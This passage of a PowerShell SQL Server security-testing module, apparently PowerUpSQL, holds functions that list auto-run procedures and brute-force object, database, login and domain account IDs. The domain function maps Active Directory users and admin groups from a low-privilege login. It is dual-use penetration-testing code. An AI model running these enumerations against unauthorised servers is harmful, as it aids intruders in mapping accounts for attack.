            $ProcedureNameFilter = " AND ROUTINE_NAME like '$ProcedureName'"
        }
        else
        {
            $ProcedureNameFilter = ''
        }

        # Setup ROUTINE_DEFINITION filter
        if ($Keyword)
        {
            $KeywordFilter = " AND ROUTINE_DEFINITION like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }
    }

    Process
    {
        # Parse ComputerName
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Checking for autoexec stored procedures..."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get role for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            # Define Query
            $Query = "  use [master];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1
                AND is_auto_executed = 1
                $ProcedureNameFilter
                $KeywordFilter"

            # Execute Query
            $TblProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            if(-not $TblProcsTemp){
                #Write-Verbose -Message "$Instance : No autoexec procedures found."
            }

            # Append results
            $TblProcs = $TblProcs + $TblProcsTemp
        }
    }

    End
    {
        # Return data
        $TblProcs
    }
}


#endregion

#########################################################################
#
#region          UTILITY FUNCTIONS
#
#########################################################################

# ----------------------------------
#  Get-SQLFuzzObjectName
# ----------------------------------
# Author: Scott Sutherland
# Reference: https://raresql.com/2013/01/29/sql-server-all-about-object_id/
# Reference: https://social.technet.microsoft.com/Forums/forefront/en-US/f73c2115-57f7-4cec-a95b-00c2d8252ace/objectid-recycled-?forum=transactsql
Function  Get-SQLFuzzObjectName
{
    <#
            .SYNOPSIS
            Enumerates objects based on object id using OBJECT_NAME() and only the Public role.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER StartId
            Principal ID to start fuzzing with.
            .PARAMETER EndId
            Principal ID to stop fuzzing with.
            .EXAMPLE
            PS C:\> Get-SQLFuzzObjectName -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 5

            ComputerName   Instance                       ObjectId ObjectName
            ------------   --------                       -------- ----------
            SQLServer1     SQLServer1\STANDARDDEV2014     3        sysrscols
            SQLServer1     SQLServer1\STANDARDDEV2014     5        sysrowsets
            SQLServer1     SQLServer1\STANDARDDEV2014     6        sysclones
            SQLServer1     SQLServer1\STANDARDDEV2014     7        sysallocunits
            SQLServer1     SQLServer1\STANDARDDEV2014     8        sysfiles1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 300,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedObjects = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # All user defined objects are assigned a positive object ID plus system tables.
        # Apart from these objects, the rest of the system objects are assigned negative object IDs.
        # This object_id comes from the primary key of system table sys.sysschobjs.The column name is id, int  data type and it is not an identity column
        # If you create a new object in the database, the first ID will always be 2073058421 in SQL SERVER 2005 and 245575913 in SQL SERVER 2012.
        # The object_ID increment counter for user defined objects will add 16000057 + Last user defined object_ID and will give you a new ID.
        <# IThis object_id comes from the primary key of system table sys.sysschobjs. The new object_id will increase 16000057 (a prime number) from
                last object_id. When the last object_id +16000057 is over the int maximum ( 2147483647), it will start with a new number before the difference
                between the new bigint number and the maximum int. This cycle will generate 134 or 135 new object_id for each cycle. The system has a maximum
                number of objects,  which is 2147483647.
                The object ID is only unique within each database.
        #>

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating objects from object IDs..."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Fuzz from StartId to EndId
        $StartId..$EndId |
        ForEach-Object -Process {
            # Define Query
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$_' as [ObjectId],
            OBJECT_NAME($_) as [ObjectName]"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            $ObjectName = $TblResults.ObjectName
            if( -not $SuppressVerbose)
            {
                if($ObjectName.length -ge 2)
                {
                    Write-Verbose -Message "$Instance : - Object ID $_ resolved to: $ObjectName"
                }
                else
                {
                    Write-Verbose -Message "$Instance : - Object ID $_ resolved to: "
                }
            }

            # Append results
            $TblFuzzedObjects = $TblFuzzedObjects + $TblResults
        }
    }

    End
    {
        # Return data
        $TblFuzzedObjects | Where-Object -FilterScript {
            $_.ObjectName.length -ge 2
        }
    }
}


# ----------------------------------
#  Get-SQLFuzzDatabaseName
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLFuzzDatabaseName
{
    <#
            .SYNOPSIS
            Enumerates databases based on database id using DB_NAME() and only the Public role.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER StartId
            Principal ID to start fuzzing with.
            .PARAMETER EndId
            Principal ID to stop fuzzing with.
            .EXAMPLE
            PS C:\> Get-SQLFuzzDatabaseName -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 5

            ComputerName   Instance                       DatabaseId DatabaseName
            ------------   --------                       ---------- ------------
            SQLServer1     SQLServer1\STANDARDDEV2014     1          master
            SQLServer1     SQLServer1\STANDARDDEV2014     2          tempdb
            SQLServer1     SQLServer1\STANDARDDEV2014     3          model
            SQLServer1     SQLServer1\STANDARDDEV2014     4          msdb
            SQLServer1     SQLServer1\STANDARDDEV2014     5          ReportServer$STANDARDDEV2014
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 300,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedDbs = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating database names from database IDs..."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Fuzz from StartId to EndId
        $StartId..$EndId |
        ForEach-Object -Process {
            # Define Query
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$_' as [DatabaseId],
            DB_NAME($_) as [DatabaseName]"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            $DatabaseName = $TblResults.DatabaseName
            if($DatabaseName.length -ge 2)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - ID $_ - Resolved to: $DatabaseName"
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - ID $_ - Resolved to:"
                }
            }

            # Append results
            $TblFuzzedDbs = $TblFuzzedDbs + $TblResults
        }
    }

    End
    {
        # Return data
        $TblFuzzedDbs | Where-Object -FilterScript {
            $_.DatabaseName.length -ge 2
        }
    }
}


# ----------------------------------
#  Get-SQLFuzzServerLogin
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLFuzzServerLogin
{
    <#
            .SYNOPSIS
            Enumerates SQL Server Logins based on login id using SUSER_NAME() and only the Public role.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER StartId
            Principal ID to start fuzzing with.
            .PARAMETER EndId
            Principal ID to stop fuzzing with.
            .PARAMETER GetRole
            Checks if the principal name is a role, SQL login, or Windows account.
            .EXAMPLE
            PS C:\> Get-SQLFuzzServerLogin -Instance SQLServer1\STANDARDDEV2014 -StartId 1 -EndId 500 | Select-Object -First 40

            ComputerName   Instance                       PrincipalId PrincipleName
            ------------   --------                       ----------  -------------
            SQLServer1     SQLServer1\STANDARDDEV2014     1           sa
            SQLServer1     SQLServer1\STANDARDDEV2014     2           public
            SQLServer1     SQLServer1\STANDARDDEV2014     3           sysadmin
            SQLServer1     SQLServer1\STANDARDDEV2014     4           securityadmin
            SQLServer1     SQLServer1\STANDARDDEV2014     5           serveradmin
            SQLServer1     SQLServer1\STANDARDDEV2014     6           setupadmin
            SQLServer1     SQLServer1\STANDARDDEV2014     7           processadmin
            SQLServer1     SQLServer1\STANDARDDEV2014     8           diskadmin
            SQLServer1     SQLServer1\STANDARDDEV2014     9           dbcreator
            SQLServer1     SQLServer1\STANDARDDEV2014     10          bulkadmin
            SQLServer1     SQLServer1\STANDARDDEV2014     101         ##MS_SQLResourceSigningCertificate##
            SQLServer1     SQLServer1\STANDARDDEV2014     102         ##MS_SQLReplicationSigningCertificate##
            SQLServer1     SQLServer1\STANDARDDEV2014     103         ##MS_SQLAuthenticatorCertificate##
            SQLServer1     SQLServer1\STANDARDDEV2014     105         ##MS_PolicySigningCertificate##
            SQLServer1     SQLServer1\STANDARDDEV2014     106         ##MS_SmoExtendedSigningCertificate##
            SQLServer1     SQLServer1\STANDARDDEV2014     121         ##Agent XPs##
            SQLServer1     SQLServer1\STANDARDDEV2014     122         ##SQL Mail XPs##
            SQLServer1     SQLServer1\STANDARDDEV2014     123         ##Database Mail XPs##
            SQLServer1     SQLServer1\STANDARDDEV2014     124         ##SMO and DMO XPs##
            SQLServer1     SQLServer1\STANDARDDEV2014     125         ##Ole Automation Procedures##
            SQLServer1     SQLServer1\STANDARDDEV2014     126         ##Web Assistant Procedures##
            SQLServer1     SQLServer1\STANDARDDEV2014     127         ##xp_cmdshell##
            SQLServer1     SQLServer1\STANDARDDEV2014     128         ##Ad Hoc Distributed Queries##
            SQLServer1     SQLServer1\STANDARDDEV2014     129         ##Replication XPs##
            SQLServer1     SQLServer1\STANDARDDEV2014     257         ##MS_PolicyTsqlExecutionLogin##
            SQLServer1     SQLServer1\STANDARDDEV2014     259         Domain\User
            SQLServer1     SQLServer1\STANDARDDEV2014     260         NT SERVICE\SQLWriter
            SQLServer1     SQLServer1\STANDARDDEV2014     261         NT SERVICE\Winmgmt
            SQLServer1     SQLServer1\STANDARDDEV2014     262         NT Service\MSSQL$STANDARDDEV2014
            SQLServer1     SQLServer1\STANDARDDEV2014     263         NT AUTHORITY\SYSTEM
            SQLServer1     SQLServer1\STANDARDDEV2014     264         NT SERVICE\SQLAgent$STANDARDDEV2014
            SQLServer1     SQLServer1\STANDARDDEV2014     265         NT SERVICE\ReportServer$STANDARDDEV2014
            SQLServer1     SQLServer1\STANDARDDEV2014     266         ##MS_PolicyEventProcessingLogin##
            SQLServer1     SQLServer1\STANDARDDEV2014     267         ##MS_AgentSigningCertificate##
            SQLServer1     SQLServer1\STANDARDDEV2014     268         MySQLUser1
            SQLServer1     SQLServer1\STANDARDDEV2014     270         MySQLUser2
            SQLServer1     SQLServer1\STANDARDDEV2014     271         MySQLUser3
            SQLServer1     SQLServer1\STANDARDDEV2014     272         MySysadmin1
            SQLServer1     SQLServer1\STANDARDDEV2014     273         Domain\User2
            SQLServer1     SQLServer1\STANDARDDEV2014     274         MySysadmin2
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of Principal IDs to fuzz.')]
        [string]$FuzzNum = 10000,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Try to determine if the principal type is role, SQL login, or Windows account via error analysis of sp_defaultdb.')]
        [switch]$GetPrincipalType,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedLogins = New-Object -TypeName System.Data.DataTable
        $null = $TblFuzzedLogins.Columns.add('ComputerName')
        $null = $TblFuzzedLogins.Columns.add('Instance')
        $null = $TblFuzzedLogins.Columns.add('PrincipalId')
        $null = $TblFuzzedLogins.Columns.add('PrincipleName')
        if($GetPrincipalType)
        {
            $null = $TblFuzzedLogins.Columns.add('PrincipleType')
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating principal names from principal IDs.."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        # Reference: https://gist.github.com/ConstantineK/c6de5d398ec43bab1a29ef07e8c21ec7
        $Query = "
                SELECT 
                '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                n [PrincipalId], SUSER_NAME(n) as [PrincipleName]
                from ( 
                select top $FuzzNum row_number() over(order by t1.number) as N
                from   master..spt_values t1 
                       cross join master..spt_values t2
                ) a
                where SUSER_NAME(n) is not null"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Process results
        $TblResults |
        ForEach-Object {

            # check if principal is role, sql login, or windows account
            $PrincipalName = $_.PrincipleName
            $PrincipalId = $_.PrincipalId

            if($GetPrincipalType)
            {
                $RoleCheckQuery = "EXEC master..sp_defaultdb '$PrincipalName', 'NOTAREALDATABASE1234ABCD'"
                $RoleCheckResults = Get-SQLQuery -Instance $Instance -Query $RoleCheckQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -ReturnError

                # Check the error message for a signature that means the login is real
                if (($RoleCheckResults -like '*NOTAREALDATABASE*') -or ($RoleCheckResults -like '*alter the login*'))
                {

                    if($PrincipalName -like '*\*')
                    {
                        $PrincipalType = 'Windows Account'
                    }
                    else
                    {
                        $PrincipalType = 'SQL Login'
                    }
                }
                else
                {
                    $PrincipalType = 'SQL Server Role'
                }
            }

            # Add to result set
            if($GetPrincipalType)
            {
                $null = $TblFuzzedLogins.Rows.Add($ComputerName, $Instance, $PrincipalId, $PrincipalName, $PrincipalType)
            }
            else
            {
                $null = $TblFuzzedLogins.Rows.Add($ComputerName, $Instance, $PrincipalId, $PrincipalName)
            }

        }
    }

    End
    {
        # Return data
        $TblFuzzedLogins | Where-Object -FilterScript {
            $_.PrincipleName.length -ge 2
        }
        
        if( -not $SuppressVerbose)
        {
            Write-Verbose -Message "$Instance : Complete."
        }
    }
}


# ----------------------------------
#  Get-SQLFuzzDomainAccount
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLFuzzDomainAccount
{
    <#
            .SYNOPSIS
            Enumerates domain groups, computer accounts, and user accounts based on domain RID using SUSER_SNAME() and only the Public role.
            Note: In a typical domain 10000 or more is recommended for the EndId.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Domain
            Set a custom domain for user enumeration. Typically used to target trusted domains.
            .PARAMETER StartId
            RID to start fuzzing with.
            .PARAMETER EndId
            RID to stop fuzzing with.
            .EXAMPLE
            PS C:\> Get-SQLFuzzDomainAccount -Instance SQLServer1\STANDARDDEV2014 -Verbose -StartId 500 -EndId 1500 -Domain TrustedDomainName
            .EXAMPLE
            PS C:\> Get-SQLFuzzDomainAccount -Instance SQLServer1\STANDARDDEV2014 -Verbose -StartId 500 -EndId 1500

            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Enumerating Domain accounts from the SQL Server's default domain...
            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f4010000 (500) Resolved to: Domain\Administrator
            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f5010000 (501) Resolved to: Domain\Guest
            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f6010000 (502) Resolved to: Domain\krbtgt
            [TRUNCATED]

            ComputerName   Instance                       DomainAccount
            ------------   --------                       -------------
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Administrator
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Guest
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\krbtgt
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Guests
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Computers
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Controllers
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Cert Publishers
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Schema Admins
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Enterprise Admins
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Group Policy Creator Owners
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Read-only Domain Controllers
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Cloneable Domain Controllers
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Protected Users
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\RAS and IAS Servers
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Allowed RODC Password Replication Group
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Denied RODC Password Replication Group
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\HelpServicesGroup

            [TRUNCATED]

            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyUser
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyDAUser
            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyEAUser
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 500,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 1000,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Set a custom domain for user enumeration. Typically used to target trusted domains.')]
        [string]$Domain,
        
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedAccounts = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."                
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Grab server and domain information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $Instance = $ServerInfo.Instance
        if(-not $Domain){
            $Domain = $ServerInfo.DomainName
        }

        # Status the user
        Write-Verbose -Message "$Instance : Enumerating Active Directory accounts for the `"$Domain`" domain..."        

        # Grab the domain SID
        $DomainGroup = "$Domain\Domain Admins"         
        $DomainGroupSid = Get-SQLQuery -Instance $Instance -Query "select SUSER_SID('$DomainGroup') as DomainGroupSid" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose            
        $DomainGroupSidBytes = $DomainGroupSid | Select-Object -Property domaingroupsid -ExpandProperty domaingroupsid       
        try{
            $DomainGroupSidString = [System.BitConverter]::ToString($DomainGroupSidBytes).Replace('-','').Substring(0,48)
        }catch{
            Write-Warning "The provided domain did not resolve correctly."
            return
        }

        # Fuzz the domain object SIDs from StartId to EndId
        $StartId..$EndId |
        ForEach-Object -Process {
            # Convert to Principal ID to hex
            $PrincipalIDHex = '{0:x}' -f $_

            # Get number of characters
            $PrincipalIDHexPad1 = $PrincipalIDHex | Measure-Object -Character
            $PrincipalIDHexPad2 = $PrincipalIDHexPad1.Characters

            # Check if number is even and fix leading 0 if needed
            If([bool]($PrincipalIDHexPad2%2))
            {
                $PrincipalIDHexFix = "0$PrincipalIDHex"
            }

            # Reverse the order of the hex
            $GroupsOfTwo = $PrincipalIDHexFix -split '(..)' | Where-Object -FilterScript {
                $_
            }
            $GroupsOfTwoR = $GroupsOfTwo | Sort-Object -Descending
            $PrincipalIDHexFix2 = $GroupsOfTwoR -join ''

            # Pad to 8 bytes
            $PrincipalIDPad = $PrincipalIDHexFix2.PadRight(8,'0')

            # Create users rid
            $Rid = "0x$DomainGroupSidString$PrincipalIDPad"

            # Define Query
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$Rid' as [RID],
            SUSER_SNAME($Rid) as [DomainAccount]"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            $DomainAccount = $TblResults.DomainAccount
            if($DomainAccount.length -ge 2)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - RID $Rid ($_) resolved to: $DomainAccount"
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - RID $Rid ($_) resolved to: "
                }
            }

            # Append results
            $TblFuzzedAccounts = $TblFuzzedAccounts + $TblResults
        }
    }

    End
    {
        # Return data
        $TblFuzzedAccounts |
        Select-Object -Property ComputerName, Instance, DomainAccount -Unique |
        Where-Object -FilterScript {
            $_.DomainAccount -notlike ''
        }
    }
}


# -------------------------------------------
# Function: Get-ComputerNameFromInstance
# ------------------------------------------
# Author: Scott Sutherland
Function Get-ComputerNameFromInstance
{
    <#
            .SYNOPSIS
            Parses computer name from a provided instance.
            .PARAMETER Instance
            SQL Server instance to parse.
            .EXAMPLE
            PS C:\> Get-ComputerNameFromInstance -Instance SQLServer1\STANDARDDEV2014
            SQLServer1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance
    )

    # Parse ComputerName from provided instance
    If ($Instance)
    {
        $ComputerName = $Instance.split('\')[0].split(',')[0]
    }
    else
    {
        $ComputerName = $env:COMPUTERNAME
    }

    Return $ComputerName
}


Function  Get-SQLServiceLocal
{
    <#
            .SYNOPSIS
            Returns local SQL Server services using Get-WmiObject -Class win32_service. This can only be run against the local server.
            .PARAMETER Instance
            SQL Server instance to filter for.
            .PARAMETER RunOnly
            Filter for running services.
            .EXAMPLE
            PS C:\> Get-SQLServiceLocal -Instance SQLServer1\SQL2014 | Format-Table -AutoSize
            .EXAMPLE
            PS C:\> Get-SQLServiceLocal | Format-Table -AutoSize

            ComputerName   ServiceDisplayName                                     ServiceName                              ServicePath
            ------------   ------------------                                     -----------                              -----------
            SQLServer1     SQL Server Integration Services 12.0                   MsDtsServer120                           "C:\Program Files\Microsoft SQL Server\120\DTS\Binn\MsDt...
            SQLServer1     SQL Server Analysis Services (STANDARDDEV2014)         MSOLAP$STANDARDDEV2014                   "C:\Program Files\Microsoft SQL Server\MSAS12.STANDARDDE...
            SQLServer1     SQL Server (SQLEXPRESS)                                MSSQL$SQLEXPRESS                         "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRES...
            SQLServer1     SQL Server (STANDARDDEV2014)                           MSSQL$STANDARDDEV2014                    "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDD...
            SQLServer1     SQL Full-text Filter Daemon Launcher (MSSQLSERVER)     MSSQLFDLauncher                          "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERV...
            SQLServer1     SQL Full-text Filter Daemon Launcher (SQLEXPRESS)      MSSQLFDLauncher$SQLEXPRESS               "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRES...
